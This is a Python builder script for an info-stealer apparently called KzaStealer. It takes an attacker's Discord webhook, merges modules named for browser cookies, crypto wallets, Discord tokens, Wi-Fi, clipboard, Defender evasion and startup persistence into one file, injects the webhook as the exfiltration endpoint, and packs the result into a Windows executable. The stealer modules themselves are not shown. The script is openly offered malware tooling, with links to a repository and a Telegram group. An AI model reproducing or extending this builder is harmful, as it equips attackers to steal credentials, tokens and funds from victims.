import os
import subprocess
import sys
import re
import shutil  # لنسخ الملفات

print("""
────────────────────────────────────────────────────────────────
                    This tool is developed by Cokza
────────────────────────────────────────────────────────────────

If you find it helpful, please:

1. Give it a star on GitHub:
   https://github.com/Cokza/KzaStealer

2. Join the Telegram group for updates:
   https://t.me/DscDevTools

────────────────────────────────────────────────────────────────
""")


# قائمة الملفات لدمجها
files_to_merge = [
    "startup.py",
    "defender.py",
    "blacklist.py",
    "screen.py",
    "systeminfo.py",
    "browser.py",
    "cookies.py",
    "files.py",
    "wallet.py",
    "discord.py",
    "Injection.py",
    "telegram.py",
    "antispam.py",
    "games.py",
    "wifi.py",
    "clipboard.py"
]

# التحقق من صحة رابط الـ Discord webhook
def is_valid_discord_webhook(url):
    # Regex للتحقق من صحة الرابط
    regex = r'^https://discord\.com/api/webhooks/\d+/[A-Za-z0-9_-]+$'
    return re.match(regex, url) is not None

# طلب الرابط من المستخدم والتحقق من صحته
def get_discord_webhook_url():
    while True:
        webhook_url = input("Please enter the Discord WEBHOOK URL: ")
        if is_valid_discord_webhook(webhook_url):
            return webhook_url
        else:
            print("Invalid Discord Webhook URL format. Please enter a valid webhook URL.")

# دمج جميع الملفات في ملف واحد
def merge_files():
    with open("script.py", "w", encoding="utf-8") as script_file:
        # كتابة تعليق في بداية الملف
        script_file.write("# Combined script with Webhook URL replaced\n\n")
        
        for file in files_to_merge:
            file_path = os.path.join("src", file)
            if os.path.exists(file_path):
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        content = f.read()
                        # إضافة اسم الملف كتعليق لتمييزه
                        script_file.write(f"\n\n# --- Start of {file} ---\n")  # إضافة تعليق مع اسم الملف
                        script_file.write(content)
                        script_file.write(f"\n\n# --- End of {file} ---\n\n")  # نهاية محتوى الملف
                except UnicodeDecodeError:
                    print(f"Warning: Could not read file {file} due to incorrect encoding.")
                    continue
            else:
                print(f"File {file} not found in 'src' folder.")

# استبدال WEBHOOK_URL بالرابط الفعلي داخل script.py
def replace_webhook_in_script(webhook_url):
    script_path = "script.py"
    if os.path.exists(script_path):
        try:
            with open(script_path, "r", encoding="utf-8") as f:
                content = f.read()

            # استبدال جميع occurrences لـ 'WEBHOOKS_URL' بالرابط
            content = content.replace("WEBHOOKS_URL", webhook_url)

            # حفظ التعديلات في script.py
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"Replaced 'WEBHOOKS_URL' in {script_path}.")
        except UnicodeDecodeError:
            print(f"Warning: Could not read file {script_path} due to incorrect encoding.")

# التحقق من وجود مكتبة pyinstaller وتثبيتها إذا لم تكن موجودة
def check_and_install_pyinstaller():
    try:
        # التحقق إذا كانت pyinstaller مثبتة
        subprocess.check_call([sys.executable, "-m", "pip", "show", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        # تثبيت pyinstaller إذا لم تكن موجودة
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        
# تحويل السكربت إلى exe باستخدام pyinstaller
def create_exe():
    try:
        # محاولة استخدام PyInstaller
        subprocess.check_call([sys.executable, "-m", "PyInstaller", "script.py"])
        print("Successfully converted the script to exe!")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while converting the script: {e}")

# تنفيذ السكربت
if __name__ == "__main__":
    check_and_install_pyinstaller()  # التحقق من وجود PyInstaller
    webhook_url = get_discord_webhook_url()  # الحصول على الرابط
    merge_files()  # دمج الملفات في script.py
    replace_webhook_in_script(webhook_url)  # استبدال WEBHOOKS_URL بالرابط الفعلي
    create_exe()  # تحويل السكربت إلى exe باستخدام pyinstaller
